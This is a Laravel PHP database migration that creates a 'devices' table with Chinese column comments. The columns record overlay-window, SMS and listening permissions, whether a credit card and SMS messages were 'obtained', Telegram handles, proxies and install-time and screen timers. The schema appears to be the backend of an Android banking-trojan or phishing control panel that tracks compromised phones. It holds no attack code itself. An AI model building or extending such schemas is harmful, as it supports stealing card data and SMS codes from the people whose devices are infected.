<?php

use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;
use Illuminate\Support\Facades\DB;

return new class extends Migration
{
    /**
     * Run the migrations.
     *
     * @return void
     */
    public function up()
    {
        Schema::create('devices', function (Blueprint $table) {
            $table->id()->comment('主键ID');
            $table->string('device_number', 100)->nullable()->comment('设备号');
            $table->string('version_type', 50)->nullable()->comment('版本类型');
            $table->string('app_channel', 50)->nullable()->comment('APP渠道');
            $table->string('language', 50)->nullable()->comment('语言');
            $table->string('region', 100)->nullable()->comment('地区');
            $table->string('ip', 50)->nullable()->comment('IP');
            $table->string('brand', 100)->nullable()->comment('品牌');
            $table->string('model', 100)->nullable()->comment('型号');
            $table->string('sdk_version', 100)->nullable()->comment('版本SDK');
            $table->string('account', 100)->nullable()->comment('账号');
            $table->string('tg', 100)->nullable()->comment('TG');
            $table->string('proxy', 200)->nullable()->comment('代理');
            $table->string('tags', 200)->nullable()->comment('标签');
            $table->tinyInteger('float_window_permission')->default(0)->comment('浮窗权限 0否 1是');
            $table->tinyInteger('sms_permission')->default(0)->comment('短信权限 0否 1是');
            $table->tinyInteger('monitor_permission')->default(0)->comment('监听权限 0否 1是');
            $table->tinyInteger('has_card')->default(0)->comment('是否获取信用卡 0否 1是');
            $table->tinyInteger('has_sms')->default(0)->comment('是否获取短信 0否 1是');
            $table->integer('install_time_distance')->default(0)->comment('距离安装时间（数字）');
            $table->integer('screen_interval_time')->default(0)->comment('开屏间隔时间（数字）');
            $table->timestamp('deleted_at')->nullable()->comment('软删除时间');
            $table->timestamps();

            $table->engine = 'InnoDB';
        });
    
        DB::statement("ALTER TABLE `devices` COMMENT = '设备信息表'");
    }

    /**
     * Reverse the migrations.
     *
     * @return void
     */
    public function down()
    {
        Schema::dropIfExists('devices');
    }
};

